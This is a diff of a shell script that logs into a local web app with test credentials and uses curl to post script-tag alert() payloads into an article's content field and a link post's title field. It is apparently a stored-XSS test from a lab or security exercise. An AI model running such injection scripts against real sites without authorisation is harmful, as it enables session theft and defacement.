@@ -8,22 +8,21 @@ else
 	PREFIX=$IP:$PORT
 fi
 
+echo "=====[Setup]====="
 POST_PAGE="$PREFIX/post.php"
 HOME_PAGE="$PREFIX/index.php"
 VIEW_PAGE="$PREFIX/view.php"
-USERNAME="alice"
-PASSWORD="passw0rd"
-
-echo "=====[Setup]====="
 echo "Using Login Page at: $POST_PAGE"
 echo "Using Home Page at: $HOME_PAGE"
 echo "Using View Page at: $VIEW_PAGE"
 
 echo "=====[Login]====="
+USERNAME="alice"
+PASSWORD="passw0rd"
 echo "Using username: $USERNAME"
 echo "Using password: $PASSWORD"
-echo "Logging in with POST request"
 
+echo "Logging in with POST request"
 curl \
 -c "cookie.txt" \
 -d "form=login" \
@@ -31,11 +30,10 @@ curl \
 -d "username=$USERNAME" \
 -d "password=$PASSWORD" \
 $POST_PAGE
-
-ARTICLE_TYPE=1
-LINK_TYPE=2
+echo
 
 echo "=====[Attack 1: Content Field of Article Post]====="
+ARTICLE_TYPE=1
 ARTICLE_POPUP="<script type='text/javascript'> alert('Popup from content field of article post');</script>"
 ARTICLE_TITLE="Attack on content field of article post"
 
@@ -52,6 +50,7 @@ curl \
 $POST_PAGE
 
 echo "=====[Attack 2: Title Field of Link Post]====="
+LINK_TYPE=2
 LINK_CONTENT="Attack on title field of link post"
 LINK_POPUP="<script type='text/javascript'> alert('Popup from title field of link post');</script>"
 
